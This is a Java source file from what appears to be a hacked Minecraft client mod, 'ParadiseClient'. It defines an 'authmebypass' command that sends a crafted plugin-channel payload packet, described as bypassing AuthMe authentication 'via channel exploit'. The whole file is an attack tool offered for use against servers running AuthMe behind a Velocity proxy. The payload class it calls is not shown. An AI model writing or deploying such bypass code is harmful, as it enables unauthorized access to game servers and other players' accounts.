package io.github.spigotrce.paradiseclientprivate.command;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import io.github.spigotrce.paradiseclientprivate.packets.AuthMeVelocityPayloadPacket;
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;

public class AuthMeBypassCommand extends Command {
    public AuthMeBypassCommand(MinecraftClient minecraftClient) {
        super("authmebypass", "Bypasses authme via channel exploit", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<FabricClientCommandSource> build() {
        return literal(getName())
                .executes(context -> {
                    Helper.sendPacket(new CustomPayloadC2SPacket(
                            new AuthMeVelocityPayloadPacket()
                    ));
                    Helper.printChatMessage("Payload packet sent!");
                    return Command.SINGLE_SUCCESS;
                });
    }
}
